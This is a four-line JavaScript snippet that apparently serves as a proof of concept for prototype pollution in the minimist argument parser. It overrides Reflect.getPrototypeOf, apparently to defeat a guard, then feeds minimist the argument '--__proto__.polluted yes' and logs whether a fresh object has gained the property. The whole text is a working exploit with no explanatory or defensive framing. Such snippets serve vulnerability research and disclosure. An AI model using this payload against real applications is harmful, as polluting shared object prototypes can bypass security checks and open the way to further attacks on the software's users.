Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
require('minimist')('--__proto__.polluted yes'.split(' '));
console.log({}.polluted);